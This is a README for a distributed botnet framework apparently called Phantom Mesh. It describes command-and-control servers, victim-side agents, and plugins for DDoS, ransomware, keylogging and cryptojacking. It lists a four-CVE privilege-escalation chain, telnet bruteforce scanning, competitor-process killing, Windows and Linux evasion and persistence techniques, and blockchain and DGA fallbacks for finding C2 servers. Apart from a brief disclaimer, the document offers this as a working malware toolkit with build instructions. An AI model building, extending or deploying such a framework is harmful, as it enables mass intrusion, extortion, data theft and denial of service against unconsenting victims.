# Phantom Mesh

A distributed, resilient command-and-control (C2) framework with modular architecture, multi-platform support, and advanced evasion capabilities.

---

## Table of Contents

- [Architecture Overview](#architecture-overview)
- [Node Types](#node-types)
- [Network Topology](#network-topology)
- [Plugin System](#plugin-system)
- [Bootstrap Mechanism](#bootstrap-mechanism)
- [Stealth Subsystem](#stealth-subsystem)
- [Protocol Specification](#protocol-specification)
- [Build Instructions](#build-instructions)
- [Smart Contract](#smart-contract)
- [Directory Structure](#directory-structure)

---

## Architecture Overview

Phantom Mesh implements a **two-tier distributed architecture** separating control infrastructure from target agents:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           CONTROL PLANE                                      │
│                      Cloud Nodes (Zig/C) — C2 Servers                        │
│                                                                              │
│    ┌──────────┐         ┌──────────┐         ┌──────────┐                   │
│    │  Cloud   │◄──────► │  Cloud   │◄──────► │  Cloud   │                   │
│    │  Node A  │   P2P   │  Node B  │   P2P   │  Node C  │                   │
│    └────┬─────┘ Gossip  └────┬─────┘ Gossip  └────┬─────┘                   │
│         │                    │                    │                          │
│         │    UDP Port 31337  │                    │                          │
│         │    Ed25519 Signed  │                    │                          │
└─────────┼────────────────────┼────────────────────┼──────────────────────────┘
          │                    │                    │
          │ MQTT (outbound)    │ MQTT              │ MQTT
          │ ChaCha20 Encrypted │                   │
          ▼                    ▼                   ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                           EXECUTION PLANE                                    │
│                      Edge Nodes (Rust) — Target Agents                       │
│                                                                              │
│    ┌─────────────────────────┐    ┌─────────────────────────┐               │
│    │   Local Network A       │    │   Local Network B       │               │
│    │                         │    │                         │               │
│    │   ┌─────────────────┐   │    │   ┌─────────────────┐   │               │
│    │   │     LEADER      │   │    │   │     LEADER      │   │               │
│    │   │  ┌───────────┐  │   │    │   │  ┌───────────┐  │   │               │
│    │   │  │MQTT Client│──┼───┼────┼───│  │MQTT Client│  │   │               │
│    │   │  └───────────┘  │   │    │   │  └───────────┘  │   │               │
│    │   │  ┌───────────┐  │   │    │   │  ┌───────────┐  │   │               │
│    │   │  │  Bridge   │  │   │    │   │  │  Bridge   │  │   │               │
│    │   │  └─────┬─────┘  │   │    │   │  └─────┬─────┘  │   │               │
│    │   └────────┼────────┘   │    │   └────────┼────────┘   │               │
│    │            │ IPC        │    │            │ IPC        │               │
│    │     ┌──────┴──────┐     │    │     ┌──────┴──────┐     │               │
│    │     │   Workers   │     │    │     │   Workers   │     │               │
│    │     │ ┌──┐ ┌──┐   │     │    │     │ ┌──┐ ┌──┐   │     │               │
│    │     │ │W1│ │W2│   │     │    │     │ │W1│ │W2│   │     │               │
│    │     │ └──┘ └──┘   │     │    │     │ └──┘ └──┘   │     │               │
│    │     └─────────────┘     │    │     └─────────────┘     │               │
│    └─────────────────────────┘    └─────────────────────────┘               │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Key Concepts

| Layer | Component | Role |
|-------|-----------|------|
| **Control Plane** | Cloud Nodes | C2 mesh with P2P gossip, signature-verified commands, attack dispatch |
| **Execution Plane** | Edge Leader | Outbound MQTT to Cloud, local coordination, plugin management |
| **Execution Plane** | Edge Worker | Task execution, reports via IPC to local Leader |

---

## Node Types

### Cloud Node (`crates/nodes/cloud`)
**Language**: Zig  
**Target**: Linux servers, IoT infrastructure  
**Role**: Command-and-Control server

| Module | Description |
|--------|-------------|
| `network/p2p.zig` | UDP gossip protocol (port 31337), neighbor table, command flood |
| `network/proxy.zig` | SOCKS proxy for traffic relay |
| `network/scanner.zig` | Network reconnaissance, telnet bruteforce |
| `network/dns.zig` | DNS resolver with DGA fallback |
| `attack/` | DDoS methods (UDP, TCP SYN, GRE, HTTP) |
| `system/killer.zig` | Competitor process termination |
| `system/stealth.zig` | Anti-debug, self-delete, process masquerade |
| `crypto/` | Ed25519 verification, ChaCha20, fast RNG |

**Protocol Features**:
- Ed25519 signature verification on all commands
- Nonce-based replay protection (64-entry circular buffer)
- Config update propagation (fan-out 5)
- Gossip interval: 60 seconds

### Edge Node (`crates/nodes/edge`)
**Language**: Rust (async/tokio)  
**Target**: Linux x86_64, Windows x64  
**Role**: Target execution agent

| Module | Description |
|--------|-------------|
| `core/runtime.rs` | Leader/Worker mode dispatch |
| `network/client.rs` | Outbound MQTT client with ChaCha20-Poly1305 |
| `network/bootstrap/` | Multi-tier C2 discovery (5 tiers) |
| `network/bridge.rs` | Worker connection handler |
| `network/local_comm.rs` | Unix socket / Named Pipe IPC |
| `network/watchdog.rs` | Network health monitor, Sepolia fallback trigger |
| `discovery/election.rs` | Bully algorithm leader election (UDP port 31338) |
| `discovery/zero_noise.rs` | Passive sniffing + covert handshake discovery |
| `discovery/eth_listener.rs` | Ethereum Sepolia event log parser |
| `stealth/` | Windows + Linux evasion modules |
| `plugins/` | Dynamic plugin loader |

**Edge Roles**:

| Role | Behavior |
|------|----------|
| **Leader** | Wins election, connects outbound to Cloud, runs Bridge for Workers |
| **Worker** | Loses election, connects to Leader via IPC, executes tasks |

---

## Network Topology

### Communication Flow

```
┌──────────────────────────────────────────────────────────────────────────┐
│ 1. BOOTSTRAP (Edge discovers Cloud addresses)                            │
│    ─────────────────────────────────────────                             │
│    Tier 0: Local Cache (/var/tmp/.phantom_nodes)                         │
│    Tier 1: DNS-over-HTTPS (TXT record via Google/Cloudflare)             │
│    Tier 2: Reddit (search tagged posts in subreddits)                    │
│    Tier 3: DGA (day-seeded domain generation)                            │
│    Tier 4: Ethereum Sepolia (event logs with daily magic)                │
│                                                                          │
│    All payloads: Ed25519 signed, verified against master public key      │
└──────────────────────────────────────────────────────────────────────────┘
                                  │
                                  ▼
┌──────────────────────────────────────────────────────────────────────────┐
│ 2. ELECTION (Edge nodes elect local Leader)                              │
│    ────────────────────────────────────────                              │
│    UDP Broadcast port 31338                                              │
│    ┌─────────────────────────────────────────┐                           │
│    │  Node A → "WHO_IS_LEADER?"              │                           │
│    │  Node B → "WHO_IS_LEADER?"              │                           │
│    │  (Wait 3 seconds for response)          │                           │
│    │  No response → Node A claims Leader     │                           │
│    │  Node A → "I_AM_LEADER"                 │                           │
│    │  Node B → Becomes Worker                │                           │
│    └─────────────────────────────────────────┘                           │
│    Conflict resolution: Higher rank (node_id % 1000) wins                │
└──────────────────────────────────────────────────────────────────────────┘
                                  │
                                  ▼
┌──────────────────────────────────────────────────────────────────────────┐
│ 3. UPLINK (Leader → Cloud)                                               │
│    ─────────────────────────                                             │
│    Leader initiates outbound TCP to Cloud address                        │
│    MQTT-like protocol with ChaCha20-Poly1305 encryption                  │
│    Heartbeat every 30 seconds                                            │
│    Watchdog: 300s timeout → triggers Sepolia fallback                    │
└──────────────────────────────────────────────────────────────────────────┘
                                  │
                                  ▼
┌──────────────────────────────────────────────────────────────────────────┐
│ 4. BRIDGE (Workers → Leader)                                             │
│    ────────────────────────                                              │
│    Workers connect to Leader via local IPC                               │
│    Linux/macOS: Unix Domain Socket                                       │
│    Windows: Named Pipe (\\.\pipe\phantom_mesh)                           │
│    LIPC framing: [WorkerID(8)][Type(1)][Length(2)][Payload]              │
│    Types: Hello, Heartbeat, Data                                         │
└──────────────────────────────────────────────────────────────────────────┘
                                  │
                                  ▼
┌──────────────────────────────────────────────────────────────────────────┐
│ 5. ZERO-NOISE DISCOVERY (Passive peer detection)                         │
│    ─────────────────────────────────────────                             │
│    Passive: Sniff UDP broadcasts (mDNS 5353, SSDP 1900, NetBIOS 137)     │
│    Filter by OUI (Intel, Realtek, Microsoft)                             │
│    Track hits, probe candidates after 3+ observations                    │
│    Active: Covert handshake on TCP 9631 (looks like CUPS/IPP)            │
│    Magic: 0xDEADBEEF → Response: magic XOR 0xCAFEBABE                    │
└──────────────────────────────────────────────────────────────────────────┘
```

### Cloud P2P Gossip Protocol

```
┌─────────────────────────────────────────────────────────────┐
│ Packet Types (UDP port 31337)                                │
├──────────────┬──────────────────────────────────────────────┤
│ GOSSIP       │ Share neighbor table (fan-out 3)             │
│ CMD          │ Attack command (Ed25519 signed)              │
│ CONFIG       │ C2 address update (signed + encrypted)       │
└──────────────┴──────────────────────────────────────────────┘

Command Packet Layout:
┌────────┬──────┬───────┬───────────┬────────┬─────────────┐
│ Magic  │ Type │ Nonce │ Signature │ Length │ Payload     │
│ 4 bytes│ 1    │ 4     │ 64        │ 2      │ N bytes     │
└────────┴──────┴───────┴───────────┴────────┴─────────────┘
```

---

## Plugin System

Dynamic plugins loaded at runtime via `libloading`:

| Plugin | Opcode | Description |
|--------|--------|-------------|
| **DDoS** | 0x01 | Distributed denial-of-service |
| **Cryptojacking** | — | Cryptocurrency mining |
| **Ransomware** | — | File encryption |
| **Keylogger** | — | Keystroke capture |
| **PrivEsc** | — | Privilege escalation (4 CVEs) |

### Privilege Escalation Exploits

| CVE | Name | Kernel Range | Reliability |
|-----|------|--------------|-------------|
| CVE-2022-0847 | Dirty Pipe | 5.8 – 5.16 | 100% |
| CVE-2021-4034 | PwnKit | Any (polkit < 0.120) | 100% |
| CVE-2024-1086 | Netfilter UAF | 5.14 – 6.6 | ~80% |
| CVE-2016-5195 | Dirty COW | 2.6.22 – 4.8 | ~90% |

Fallback chain: Dirty Pipe → PwnKit → Netfilter → Dirty COW

---

## Stealth Subsystem

### Windows (`stealth/windows/`)

| Module | Technique |
|--------|-----------|
| `syscalls.rs` | Indirect syscalls (Hell's Gate / Halo's Gate) |
| `ghosting.rs` | Process ghosting (execute from deleted file) |
| `obfuscation.rs` | Sleep obfuscation (Ekko technique) |
| `stack_spoof.rs` | Synthetic call stack frames |
| `blinding.rs` | ETW + AMSI patching |
| `persistence.rs` | COM hijacking, WMI subscription, hidden task |
| `ads.rs` | NTFS Alternate Data Streams |

### Linux (`stealth/linux/`)

| Module | Technique |
|--------|-----------|
| `memfd.rs` | Fileless execution via `memfd_create` + `fexecve` |
| `persistence.rs` | Systemd generator injection |
| `hijack.rs` | ELF RPATH patching |
| `anti_forensics.rs` | Bind mount masking |
| `ebpf.rs` | eBPF-based process/network hiding (root only) |

---

## Protocol Specification

### Wire Format (MQTT-like)

```
┌─────────────────┬──────────────────┬───────────────────────┐
│ Fixed Header    │ Variable Length  │ Payload               │
│ (1 byte: 0x30)  │ (1-4 bytes)      │ (N bytes)             │
└─────────────────┴──────────────────┴───────────────────────┘
```

### Encryption (Edge ↔ Cloud)

- **Algorithm**: ChaCha20-Poly1305 (AEAD)
- **Key**: 256-bit symmetric (placeholder: derived in production)
- **Nonce**: 96-bit random per message
- **Format**: `[Nonce (12)][Ciphertext][Tag (16)]`

### Signature Verification

Bootstrap payloads and Cloud commands use Ed25519:
- Master public key hardcoded (32 bytes)
- Signature appended to message (64 bytes)

---

## Build Instructions

### Edge Node (Rust)

```bash
cargo build -p edge --release

# Cross-compile for Linux
cargo build -p edge --release --target x86_64-unknown-linux-musl
```

### Cloud Node (Zig)

```bash
make cloud_macos       # macOS native
make cloud_linux_x64   # Linux x86_64 (via Zig)
make cloud_linux_arm64 # Linux ARM64 (via Zig)
```

### Plugins

```bash
cargo build -p ddos --release
cargo build -p cryptojacking --release
cargo build -p ransomware --release
cargo build -p keylogger --release
```

---

## Smart Contract

Ethereum Sepolia contract for dead-drop C2 fallback:

- **Contract**: `smart_contracts/signal.sol`
- **Name**: `GameScoreSync`
- **Mechanism**: Event-based data storage via `ScoreSubmitted`
- **Security**: Immutable trusted signer, ECDSA verification

**Event Structure**:
```solidity
event ScoreSubmitted(uint256 indexed magic_id, bytes payload);
// magic_id = day_slot XOR 0xCAFEBABE (xorshift scrambled)
// payload = [Magic(4)][IV(12)][EncryptedData][Signature(64)]
```

---

## Directory Structure

```
phantom-mesh/
├── crates/
│   ├── nodes/
│   │   ├── cloud/               # C2 Server (Zig)
│   │   │   └── src/
│   │   │       ├── network/     # P2P gossip, proxy, scanner, DNS
│   │   │       ├── attack/      # DDoS methods
│   │   │       ├── system/      # Stealth, killer
│   │   │       └── crypto/      # Ed25519, ChaCha20
│   │   │
│   │   └── edge/                # Target Agent (Rust)
│   │       └── src/
│   │           ├── core/        # Leader/Worker runtime
│   │           ├── network/     # MQTT client, bootstrap, bridge
│   │           ├── discovery/   # Election, zero-noise, ETH listener
│   │           ├── stealth/     # Windows + Linux evasion
│   │           └── plugins/     # Dynamic loader
│   │
│   ├── plugins/
│   │   ├── ddos/
│   │   ├── cryptojacking/
│   │   ├── ransomware/
│   │   ├── keylogger/
│   │   └── privesc/             # 4 CVE exploits
│   │
│   └── shared/
│       ├── protocol/            # Wire format, types
│       └── plugin_api/          # Plugin interface
│
└── smart_contracts/
    └── signal.sol               # Ethereum dead-drop
```

---

## License

Proprietary. Unauthorized distribution prohibited.

---

## Disclaimer

This software is provided for authorized security research and red team operations only. The authors assume no liability for misuse.
